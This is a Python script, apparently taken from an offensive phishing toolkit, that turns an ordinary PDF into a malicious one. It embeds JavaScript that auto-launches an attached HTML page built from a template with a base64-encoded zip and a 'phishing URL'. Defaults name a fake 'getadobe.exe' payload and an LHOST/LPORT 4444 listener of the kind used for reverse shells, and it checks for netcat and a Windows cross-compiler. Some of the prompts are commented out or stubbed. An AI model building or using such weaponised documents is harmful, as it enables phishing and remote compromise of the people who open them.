

import os, time, signal, sys
from random import randint
from PyPDF2 import PdfFileWriter, PdfFileReader


def dependencies():

 os.system('command -v base64 > /dev/null 2>&1 || { echo >&2 "Install base64"; }')
 os.system('command -v zip > /dev/null 2>&1 || { echo >&2 "Install zip"; }')
 os.system('command -v netcat > /dev/null 2>&1 || { echo >&2 "Install netcat"; }')
 os.system('command -v php > /dev/null 2>&1 || { echo >&2 "Install php"; }')
 # os.system('command -v ssh > /dev/null 2>&1 || { echo >&2 "Install ssh"; }')
 os.system('command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "Install mingw-w64"; }')





def create_pdf(url,pdf_name,payload_name):

 #print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Generating PDF file...\033[0m")
 #time.sleep(2)
 unmeta=PdfFileReader("%s" % (pdf_name), "rb")
 meta=PdfFileWriter()
 meta.appendPagesFromReader(unmeta)
 meta.addJS('this.exportDataObject({ cName: "page.html", nLaunch: 2 });')
 with open("page.html", "rb") as fp:
     #print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Attaching page.html to PDF...\033[0m")
     meta.addAttachment("page.html", fp.read())
 with open("%s" % (pdf_name), "wb") as fp:
   meta.write(fp)
 print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] PDF Generated!\033[0m")
 #print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Converting PDF file to base64\033[0m")
 #time.sleep(2)
 os.system('zip %s.zip %s > /dev/null 2>&1' % (pdf_name,pdf_name))
 os.system('base64 -w 0 %s.zip > b64' % (pdf_name))
 with open ("b64", 'r') as get_b64:
   data=get_b64.read().strip()
 #print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Injecting Data URI (base64) code into index.html\033[0m")
 #time.sleep(2)
 os.system("sed 's+url_website+'%s'+g' template.html  > index.html" % (url))
 f = open("index.html", 'r')
 filedata = f.read()
 f.close()
 newdata = filedata.replace("data_base64", "%s" % (data))
 f=open("index.html", 'w')
 f.write(newdata)
 f.close()



def payload(payload_name,pdf_name,url):
  
 with open ("b64", 'r') as get_b64:
   data=get_b64.read().strip()

 #print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Injecting Data URI (base64) code into page.html\033[0m")
 #time.sleep(2)
 os.system("sed 's+url_website+'%s'+g' template.html > page.html" % (url))
 f = open("page.html", 'r')
 filedata = f.read()
 f.close()
 newdata = filedata.replace("data_base64", "%s" % (data))

 f=open("page.html", 'w')
 f.write(newdata)
 f.close()
 create_pdf(url,pdf_name,payload_name)


def start(pdf_name):


 exists = os.path.isfile(pdf_name)



 file_exe='n'
 global custom_file
 if file_exe in "Y,y,Yes,yes":

   file_path=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] File path: \033[0m')

   if not os.path.isfile(file_path):
     #print('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] File Not Found! \033[0m')
     sys.exit()
   else:
     custom_file=True
     payload_name=file_path

 else:
   custom_file=False
   name_default="getadobe"
   #payload_name=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Exe file name (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (name_default))
   payload_name=""
   if payload_name == "":
     payload_name=name_default+".exe"
   else:
     payload_name=payload_name+".exe" 

   global payload_server
   global payload_port
   #payload_server=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] LHOST: \033[0m' )
   payload_server='n'
   if payload_server == "":
     sys.exit()
   default_lport="4444"
   #payload_port=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] LPORT (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (default_lport))
   payload_port=""
   if payload_port == "":
     payload_port=default_lport

 url_default="https://127.0.0.1:5000"
 #url=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Phishing URL (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (url_default))
 url=""
 if url == "":
   url=url_default

 payload(payload_name,pdf_name,url)#,default_port1)



